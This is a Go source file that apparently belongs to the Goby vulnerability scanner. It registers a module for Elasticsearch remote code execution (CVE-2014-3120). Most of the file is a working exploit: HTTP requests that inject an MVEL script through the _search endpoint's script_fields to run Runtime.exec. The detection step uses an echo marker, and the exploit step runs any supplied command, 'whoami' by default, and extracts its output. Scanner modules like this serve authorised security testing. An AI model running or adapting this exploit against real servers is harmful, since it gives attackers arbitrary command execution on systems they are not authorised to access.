package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Elasticsearch Remote Code Execution CVE-2014-3120",
  "Description": "The default configuration before Elasticsearch 1.2 enabled dynamic scripting, which allowed remote attackers to execute arbitrary MVEL expressions and Java code through the source parameter of _search.",
  "Product": "Elasticsearch",
  "Homepage": "https://gobies.org/",
  "DisclosureDate": "2021-04-10",
  "Author": "zhzyker",
  "GobyQuery": "product=elasticsearch",
  "Level": "3",
  "Impact": "<p>ElasticSearch is an open source, distributed, RESTful search engine built on Lucene. Designed for use in cloud computing, it can achieve real-time, stable, reliable and fast search, and is easy to install and use. Supports data indexing via HTTP request and using JSON.</p><p>Since ElasticSearch has enabled dynamic script execution by default, any user can execute arbitrary Java code by constructing a specially crafted submission.</p>",
  "Recommandation": "<p>The official version of elasticsearch 1.2 has been publicly released, and the dynamic script execution function is disabled by default.<br></p>",
  "References": [
    "https://github.com/zhzyker"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/website/blog/",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "{ \"name\": \"cve-2014-3120\" }"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "201",
            "bz": "http_code"
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/_search?pretty",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"command\":{\"script\":\"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"echo 0d455d3d2044e6e7781771d932e68dbc_goby_nb\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "0d455d3d2044e6e7781771d932e68dbc",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/website/blog/",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "{ \"name\": \"cve-2014-3120\" }"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "201",
            "bz": "http_code"
          }
        ]
      },
      "SetVariable": [
        "output|lastbody"
      ]
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/_search?pretty",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"command\":{\"script\":\"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"{{{cmd}}}\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": "http_code"
          }
        ]
      },
      "SetVariable": [
        "output|lastbody|regex|(?s)\"command\" : (.*)}"
      ]
    }
  ],
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
